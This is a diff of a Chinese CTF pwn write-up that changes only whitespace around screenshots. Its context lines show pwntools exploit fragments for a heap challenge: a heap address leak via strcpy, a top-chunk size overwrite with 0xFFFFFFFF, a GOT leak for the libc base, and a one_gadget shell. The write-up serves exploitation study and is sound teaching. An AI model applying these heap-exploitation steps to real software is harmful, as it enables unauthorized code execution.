@@ -120,6 +120,7 @@ delete函数在释放chunk时存在UAF漏洞
 	  return i;
 	}
 三个参数，a1为要输入的地址，a2为输入大小，a3为截止符
+
 #### 先把前面的一些东西写好
 	from pwn import *
 	from LibcSearcher import *
@@ -158,8 +159,11 @@ delete函数在释放chunk时存在UAF漏洞
 	   sla('id:',str(index))
 ### 分析：
 程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png)
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png)
+
 strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来
 
 	sa('name:','a'*64)
@@ -167,11 +171,14 @@ strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如
 	heap_addr = u32(r(4)) - 0x8
 	lg('heap_addr',heap_addr)
 	dbg()
+	
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png)
 
 
 再看另一个函数
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png)
+
 ### 栈布局
 
 	-0000005C v2 dd ?
@@ -192,6 +199,7 @@ strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如
 	sla('Host:',p32(0xFFFFFFFF))
 	top_chunk_addr = heap_addr  + 0x48*3 - 0x8
 	lg('top_chunk_addr',(top_chunk_addr))
+	
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png)
 
 
@@ -223,6 +231,7 @@ strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如
 	delete(2)
 	dbg()
 free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png)
 
 	#本地
@@ -238,6 +247,7 @@ free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_ma
 
 		delete(1)
 		itr()
+		
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png)
 ### exp 
  	
